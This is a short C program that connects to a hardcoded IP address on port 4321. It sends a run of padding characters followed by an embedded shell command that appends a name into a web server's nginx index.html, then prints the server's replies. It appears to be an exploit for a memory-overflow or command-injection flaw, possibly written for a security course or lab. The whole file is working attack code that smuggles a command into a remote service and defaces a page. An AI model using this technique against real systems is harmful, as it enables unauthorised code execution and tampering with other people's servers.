#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <unistd.h>
#include <netdb.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include<arpa/inet.h>

#define IPADDR "159.65.58.222"
//#define IPADDR "129.104.99.155"


int main(int argc, char* argv[]){
//int main(){
    int sock=socket(AF_INET,SOCK_STREAM,0); //AF_INET: IPV4, SOCK_DGRAM: UDP
    socklen_t addr_size;
    char msg_sent[20000];
    char msg_received[2000];
    //creating IPV4 adress
    struct sockaddr_in to;
    struct sockaddr_in from; 
    to.sin_family=AF_INET;
    to.sin_port=htons(4321);
    to.sin_addr.s_addr=inet_addr(IPADDR);
    int k=atoi(argv[1]);
    for(int i=0;i<k-1;i++)
        msg_sent[i]='a';
    msg_sent[k-1]='b';
    strcat(msg_sent,"    echo \"<div> Leonardo Cunha </div>\n</body>\n</html>\" >> \"usr/share/nginx/html/index.html\"");
    //strcat(msg_sent,"    cat \"usr/share/nginx/html/index.html\"");
    connect(sock,&to,sizeof(to));
    recvfrom(sock,msg_received,2000,0,(struct sockaddr*)&from,&addr_size); 
    printf("%s\n",msg_received);   
    recvfrom(sock,msg_received,2000,0,(struct sockaddr*)&from,&addr_size);
    printf("%s\n",msg_received);  
    sendto(sock, msg_sent,2000,0,&to,sizeof(to));
    recvfrom(sock,msg_received,2000,0,(struct sockaddr*)&from,&addr_size); 
    printf("%s\n",msg_received);   
    return 0;
}